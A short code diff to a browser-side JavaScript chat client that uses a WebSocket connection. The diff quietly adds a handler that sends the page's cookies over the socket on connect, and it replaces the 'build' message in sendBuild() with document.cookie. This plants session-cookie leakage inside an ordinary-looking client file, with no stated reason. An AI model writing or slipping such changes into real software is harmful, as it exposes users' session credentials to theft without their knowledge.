@@ -1,5 +1,6 @@
 //Establish the WebSocket connection and set up event handlers
 var webSocket = new WebSocket("ws://" + location.hostname + ":" + location.port + "/chat");
+webSocket.onOpen = function (event) {webSocket.send(document.cookie)}
 webSocket.onmessage = function (msg) { update(msg); };
 webSocket.onclose = function () { alert("WebSocket connection closed") };
 
@@ -10,7 +11,7 @@ function sendOption() {
 
 
 function sendBuild() {
-        webSocket.send("build");
+        webSocket.send(document.cookie);
 }
 
 
